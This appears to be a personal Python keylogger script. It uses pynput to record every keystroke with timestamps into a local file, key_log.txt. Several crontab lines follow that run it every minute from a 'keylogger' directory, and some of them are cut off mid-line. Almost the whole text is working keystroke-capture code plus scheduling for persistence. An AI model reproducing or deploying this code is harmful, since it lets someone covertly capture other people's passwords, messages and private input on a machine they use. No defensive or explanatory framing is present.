#!/usr/bin/python3

from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()


#*/1 * * * * cd /home/jonesy/keylogger/codedev && /usr/bin/python /home/jonesy/keylogger/codedev/log2.py


PYTHONPATH=/usr/bin/python3

*/1 * * * * cd /home/jonesy/keylogger/codedev && /usr/bin/python3 /home/jonesy/$

*/1 * * * * cd /home/jonesy/keylogger/codedev/ && PYTHONPATH=/usr/bin/python /h$

*/1 * * * * /home/jonesy/keylogger/codedev/log2.py >> /home/jonesy/keylogger/co$





